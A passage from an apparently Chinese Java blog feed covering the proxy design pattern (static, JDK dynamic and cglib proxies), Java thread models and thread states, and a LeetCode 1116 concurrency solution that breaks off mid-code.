<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Subject subject = <span class="keyword">new</span> SubjectProxy();</span><br><span class="line">		subject.Request();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Before call RealSubject Request</span><br><span class="line">RealSubject Request method called.</span><br><span class="line">After call RealSubject Request</span><br></pre></td></tr></table></figure>

<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理就是，在程序运行之前，就是编译之前就已经确定了代理类和委托类的关系。它可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。值得注意的是，代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。</p>
<p>上文的例子就是一个静态代理的例子。</p>
<p>它的优点呢，就是<strong>可以在不修改目标对象的前提下扩展目标对象的功能</strong>。</p>
<p>缺点也显而易见：</p>
<ol>
<li>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。</li>
<li>不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</li>
</ol>
<p>如果Subject又增加了一个Response方法，那么代理类和被代理类都需要修改，牵一发而动全身。</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>代理类在程序运行时创建的代理方式被成为动态代理。 我们上面静态代理的例子中，代理类(SubjectProxy)是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。</p>
<p>实现动态代理有两种方式，利用JDK自带的API和使用cglib库。</p>
<h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><p>在java的java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。</p>
<p>接下来我们把上面的例子改造成动态代理</p>
<h4 id="Subject-1"><a href="#Subject-1" class="headerlink" title="Subject"></a>Subject</h4><p>还是老样子，没有变化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="RealSubject-1"><a href="#RealSubject-1" class="headerlink" title="RealSubject"></a>RealSubject</h4><p>也没有变化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(<span class="string">"Dynamic RealSubject Request method called."</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SubjectDynamicProxy"><a href="#SubjectDynamicProxy" class="headerlink" title="SubjectDynamicProxy"></a>SubjectDynamicProxy</h4><p>动态代理类，注意它的实现，匿名内部类，重写了invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubjectDynamicProxy</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Object target;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SubjectDynamicProxy</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.target = target;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getSubJectInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">				System.out.println(<span class="string">"Before dynamic proxy method called."</span>);</span><br><span class="line">				</span><br><span class="line">				method.invoke(target, args);</span><br><span class="line">				</span><br><span class="line">				System.out.println(<span class="string">"After dynamic proxy method called."</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SubjectDynamicProxy还可以通过继承接口InvocationHandler来实现，本质上是一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubjectDynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Object target;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SubjectDynamicProxy</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.target = target;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Before dynamic proxy method called."</span>);</span><br><span class="line">		</span><br><span class="line">		method.invoke(target, args);</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"After dynamic proxy method called."</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getSubJectInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Subject target = <span class="keyword">new</span> RealSubject();</span><br><span class="line">        System.out.println(target.getClass());  <span class="comment">//输出目标对象信息</span></span><br><span class="line">        Subject proxy = (Subject) <span class="keyword">new</span> SubjectDynamicProxy(target).getSubJectInstance();</span><br><span class="line">        System.out.println(proxy.getClass());  <span class="comment">//输出代理对象信息</span></span><br><span class="line">        proxy.Request();  <span class="comment">//执行代理方法</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class com.proxy.dynamic.RealSubject</span><br><span class="line">class com.sun.proxy.$Proxy0</span><br><span class="line">Before dynamic proxy method called.</span><br><span class="line">Dynamic RealSubject Request method called.</span><br><span class="line">After dynamic proxy method called.</span><br></pre></td></tr></table></figure>

<p>静态代理和动态代理的区别主要在：</p>
<ul>
<li>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件</li>
<li>动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</li>
<li>动态代理不需要实现接口，但是要求目标对象必须实现接口，否则不能使用动态代理</li>
</ul>
<h3 id="cglib动态代理"><a href="#cglib动态代理" class="headerlink" title="cglib动态代理"></a>cglib动态代理</h3><p>cglib是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展</p>
<ul>
<li>JDK的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口</li>
<li>CGLIB是一个强大的高性能的代码生承包，它可以在运行期扩展Java类与实现Java接口</li>
<li>CGLIB包的底层是通过使用一个小而快的字节码处理框架ASM，来转换字节码并生成新的类</li>
</ul>
<p>CGLIB和动态代理最大的区别就是</p>
<ul>
<li>使用动态代理的对象必须实现一个或多个接口</li>
<li>使用cglib代理的对象则无需实现接口，达到代理类无侵入</li>
</ul>
<p>下面看一个例子</p>
<h4 id="RealSubject-2"><a href="#RealSubject-2" class="headerlink" title="RealSubject"></a>RealSubject</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Real subject method request for cglib"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CglibSubjectProxy"><a href="#CglibSubjectProxy" class="headerlink" title="CglibSubjectProxy"></a>CglibSubjectProxy</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CglibSubjectProxy</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Object target;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">CglibSubjectProxy</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.target = target;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getSubJectInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Enhancer en = <span class="keyword">new</span> Enhancer();</span><br><span class="line">		en.setSuperclass(target.getClass());</span><br><span class="line">		en.setCallback(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">return</span> en.create();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object arg0, Method arg1, Object[] arg2, MethodProxy arg3)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"Before cglib proxy method called."</span>);</span><br><span class="line">		</span><br><span class="line">		arg1.invoke(target, arg2);</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"After cglib proxy method called."</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Test-1"><a href="#Test-1" class="headerlink" title="Test"></a>Test</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		RealSubject subject = <span class="keyword">new</span> RealSubject();</span><br><span class="line">		System.out.println(subject.getClass());</span><br><span class="line">		</span><br><span class="line">		RealSubject proxy = (RealSubject) <span class="keyword">new</span> CglibSubjectProxy(subject).getSubJectInstance();</span><br><span class="line">		System.out.println(proxy.getClass());</span><br><span class="line">		proxy.Request();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class com.proxy.cglib.RealSubject</span><br><span class="line">class com.proxy.cglib.RealSubject$$EnhancerByCGLIB$$a5790549</span><br><span class="line">Before cglib proxy method called.</span><br><span class="line">Real subject method request for cglib</span><br><span class="line">After cglib proxy method called.</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>静态代理实现较简单，只要代理对象对目标对象进行包装，即可实现增强功能，但静态代理只能为一个目标对象服务，如果目标对象过多，则会产生很多代理类。</li>
<li>JDK动态代理需要目标对象实现业务接口，代理类只需实现InvocationHandler接口。</li>
<li>动态代理生成的类为class com.sun.proxy.$Proxy0，cglib代理生成的类为class com.cglib.UserDao$$EnhancerByCGLIB$$a5790549。</li>
<li>静态代理在编译时产生class字节码文件，可以直接使用，效率高。</li>
<li>动态代理必须实现InvocationHandler接口，通过反射代理方法，比较消耗系统性能，但可以减少代理类的数量，使用更灵活。</li>
<li>cglib代理无需实现接口，通过生成类字节码实现代理，比反射稍快，不存在性能问题，但cglib会继承目标对象，需要重写方法，所以目标对象不能为final类。</li>
</ol>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>动态代理</tag>
        <tag>代理</tag>
        <tag>静态代理</tag>
        <tag>cglib</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存模型</title>
    <url>/2020/04/07/Java/JVM/2020-04-07-Java%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Java与线程"><a href="#Java与线程" class="headerlink" title="Java与线程"></a>Java与线程</h1><p>线程是比进程更轻量级的调度执行单位，线程的引入，可以吧一个进程的资源分配和执行调度分开，各个线程既可以共享进程资源，又可以独立调度。目前线程时Java里面进行处理器资源调用的最基本单位。</p>
<h2 id="线程的实现"><a href="#线程的实现" class="headerlink" title="线程的实现"></a>线程的实现</h2><p>实现线程只要有三种方式：使用内核线程实现（1：1实现），使用用户线程实现（1：N实现），使用用户线程加轻量级进程或者实现（N:M实现）。</p>
<h3 id="内核线程实现"><a href="#内核线程实现" class="headerlink" title="内核线程实现"></a>内核线程实现</h3><p>使用内核线程实现的方式也被称为1：1实现。内核线程就是直接由操作系统内核支持的线程，这种线程由内核来完成线程切换，内核通过操纵调度器对线程进行调度，并负责将线程的任务映射到各个处理器上。每个内核线程可以视为内核的一个分身，这样操作系统就有能力同时处理多件事情，支持多线程的内核就称为多线程内核。</p>
<p>程序一般不会直接使用内核线程，而是使用内核线程的一种高级接口-轻量级进程（Light Weight Process，LWP），轻量级进程就是我们通常意义上所讲的线程，由于每个轻量级进程都由一个内核线程支持，因此只有先支持内核线程，才能有轻量级进程。这种轻量级进程和内核线程之间1：1的关系成为一对一的线程模型。</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-1-to-1.jpg" alt="1：1线程模型"></p>
<p>由于内核线程的支持，每个轻量级进程都成为一个独立的调度单元，即使其中某一个轻量级进程在系统调用中被阻塞了，也不会影响整个进程继续工作。轻量级进程也具有它的局限性：首先，由于是基于内核线程实现的，所以各种线程操作，如创建、析构及同步，都需要进行系统调用。而系统调用的代价相对较高，需要在用户态和内核态中来回切换。其次，每个轻量级进程都需要一个内核线程的支持，因此轻量级进程要消耗一定的内核资源，因此一个系统支持轻量级进程的数量是有限的。</p>
<h3 id="用户线程实现"><a href="#用户线程实现" class="headerlink" title="用户线程实现"></a>用户线程实现</h3><p>用户线程指的是完全建立在用户空间的线程库上，系统内核不能感知到用户线程的存在以及如何实现的，用户线程的建立、同步、销毁和调用完全在用户态中完成，不需要内核的帮助。这种进程与用户线程之间的1：N的关系成为一对多的线程模型。</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-1-to-m.jpeg" alt="一对多模型"></p>
<p>用户线程的优势在于不需要系统内核支援，劣势也在于没有系统内核的支援，所有的线程操作都需要用户程序自己处理。因此使用用户线程实现的程序一般都比较复杂。</p>
<h3 id="混合实现"><a href="#混合实现" class="headerlink" title="混合实现"></a>混合实现</h3><p>混合实现时，用户线程还是完全建立在用户空间中，而操作系统提供支持的轻量级进程则作为用户线程和内核线程之间的桥梁。在这种混合模式中，用户线程与轻量级进程的数量比是不定的，即为 N:M 的关系，这种就是<strong>多对多的线程模型</strong>。</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-n-to-m.jpeg" alt="多对多模型"></p>
<p><strong>混合实现的好处：</strong></p>
<ul>
<li>用户线程的操作依然廉价，并且可以支持大规模的用户线程并发。</li>
<li>可以使用内核提供的线程调度功能及处理器映射。</li>
<li>由于用户线程的系统调用要通过轻量级进程来完成，因此大大降低了整个进程被完全阻塞的风险。</li>
</ul>
<h3 id="Java线程实现"><a href="#Java线程实现" class="headerlink" title="Java线程实现"></a>Java线程实现</h3><p>从JDK1.3起，“主流”平台上的“主流”商用Java虚拟机的线程模型普遍都被替换为基于操作系统原生线程模型来实现，即采用1：1的线程模型。</p>
<h3 id="Java线程调度"><a href="#Java线程调度" class="headerlink" title="Java线程调度"></a>Java线程调度</h3><p>线程调度是指系统为线程分配处理器使用权的过程，主要调度方式有两种：协同式线程调度和抢占式线程调度。</p>
<h4 id="协同式线程调度"><a href="#协同式线程调度" class="headerlink" title="协同式线程调度"></a>协同式线程调度</h4><p>线程的执行时间由线程本身来控制，线程执行完之后，主动通知系统切换到另外一个线程上。</p>
<p>协同式线程调度最大的好处是实现简单，而且切换线程的操作对线程自己是可知的，所以没有什么线程同步的问题。它的坏处就是线程执行时间不可控，如果一个线程编写有问题，一直不告知系统进行线程切换，那么程序就会一直阻塞在那里。</p>
<h4 id="抢占式线程调度"><a href="#抢占式线程调度" class="headerlink" title="抢占式线程调度"></a>抢占式线程调度</h4><p>每个线程由系统来分配执行时间，线程的切换不由线程本身来决定。</p>
<p>使用抢占式线程调度时，线程的执行时间是系统可控的，不会有一个线程导致整个进程阻塞的问题。</p>
<p>Java 使用的线程调度方式就是抢占式调度。</p>
<h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><p>Java语言定义了6种线程状态，在任意一个时间点中，一个线程只能由且只有其中的一种状态，并且可以通过特定的方法在不同状态之间切换。这6状态分别是：</p>
<ul>
<li><strong>新建</strong>：创建后尚未启动的线程处于这种状态</li>
<li><strong>运行</strong>：包括操作系统线程状态中的Running和Ready，也就是处于此状态的线程有可能正在执行，也有可能正在等待着操作系统为它分配执行时间</li>
<li><strong>无限期等待</strong>：处于这种状态的线程不会被分配处理器执行时间，它们要等待被其他线程显式唤醒。以下方法会让线程陷入无限期的等待状态：<ul>
<li>没有设置Timeout参数的Object::wait()方法</li>
<li>没有设置Timeout参数的Thread::join()方法</li>
<li>LockSupport::park()方法</li>
</ul>
</li>
<li><strong>限期等待</strong>：处于这种状态的线程也不会被分配处理器执行时间，不过无需等待被其他线程显式唤醒，在一定时间之后它们会由系统自动唤醒。以下方法会让线程进入限期等待状态：<ul>
<li>Thread::sleep()方法</li>
<li>设置了Timeout参数的Object::wait()方法</li>
<li>设置了Timeout参数的Thread::join()方法</li>
<li>LockSupport::parkNanos()方法</li>
<li>LockSupport::parkUntile()方法</li>
</ul>
</li>
<li><strong>阻塞</strong>：线程被阻塞了，“阻塞状态”与“等待状态”的区别是“阻塞状态”在等待着获取一个排他锁，这个时间将在另外一个线程放弃这个锁的时候发生；而等待状态则是在等待一段时间，或者唤醒动作的发生。在程序等待进入同步区域的时候，线程将进入这种状态。</li>
<li><strong>结束</strong>：已终止线程的线程状态，线程已经结束运行。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-07-thread-status.jpeg" alt="线程状态转换关系"></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>线程</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>1116. 打印零与奇偶数</title>
    <url>/2020/04/06/LeetCode/leetcode-001116-%E6%89%93%E5%8D%B0%E9%9B%B6%E4%B8%8E%E5%A5%87%E5%81%B6%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设有这么一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZeroEvenOdd</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ZeroEvenOdd</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; ... &#125;      <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zero</span><span class="params">(printNumber)</span> </span>&#123; ... &#125;  <span class="comment">// 仅打印出 0</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">even</span><span class="params">(printNumber)</span> </span>&#123; ... &#125;  <span class="comment">// 仅打印出 偶数</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">odd</span><span class="params">(printNumber)</span> </span>&#123; ... &#125;   <span class="comment">// 仅打印出 奇数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相同的一个 <code>ZeroEvenOdd</code> 类实例将会传递给三个不同的线程：</p>
<ol>
<li>线程 A 将调用 <code>zero()</code>，它只输出 0 。</li>
<li>线程 B 将调用 <code>even()</code>，它只输出偶数。</li>
<li>线程 C 将调用 <code>odd()</code>，它只输出奇数。</li>
</ol>
<p>每个线程都有一个 <code>printNumber</code> 方法来输出一个整数。请修改给出的代码以输出整数序列 <code>010203040506</code>… ，其中序列的长度必须为 2<em>n</em>。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2</span><br><span class="line">输出：&quot;0102&quot;</span><br><span class="line">说明：三条线程异步执行，其中一个调用 zero()，另一个线程调用 even()，最后一个线程调用odd()。正确的输出为 &quot;0102&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5</span><br><span class="line">输出：&quot;0102030405&quot;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用Lock和Condition</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZeroEvenOdd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span>     start = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> who;</span><br><span class="line">    <span class="keyword">private</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">    <span class="keyword">private</span> Condition zero = lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> Condition even = lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> Condition odd = lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZeroEvenOdd</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// printNumber.accept(x) outputs "x", where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zero</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (start &lt;= n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (who!=<span class="number">0</span>) &#123;</span><br><span class="line">                    zero.await();</span><br><span class="line">                &#125;</span><br><span class="line">                printNumber.accept(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (start % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    who=<span class="number">2</span>;</span><br><span class="line">                    even.signal();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    who=<span class="number">1</span>;</span><br><span class="line">                    odd.signal();</span><br><span class="line">                &#125;</span><br><span class="line">                zero.await();</span><br><span class="line">            &#125;</span><br><span class="line">            odd.signal();</span><br><span class="line">            even.signal();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//偶数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">even</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (start &lt;= n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (who!=<span class="number">2</span>) &#123;</span><br><span class="line">                    even.await();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    printNumber.accept(start++);</span><br><span class="line">                    who=<span class="number">0</span>;</span><br><span class="line">                    zero.signal();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//基数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">odd</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (start &lt;= n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (who!=<span class="number">1</span>) &#123;</span><br><span class="line">                    odd.await();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    printNumber.accept(start++);</span><br><span class="line">                    who=<span class="number">0</span>;</span><br><span class="line">                    zero.signal();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用Semaphore</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZeroEvenOdd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">private</span> Semaphore zeroSemaphore = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> Semaphore evenSemaphore = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> Semaphore oddSemaphore = <span class="keyword">new</span> Semaphore(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZeroEvenOdd</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber.accept(x) outputs "x", where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zero</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            zeroSemaphore.acquire();</span><br><span class="line">            <span class="keyword">if</span> (i &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            printNumber.accept(<span class="number">0</span>);</span><br><span class="line">            oddSemaphore.release();<span class="comment">// 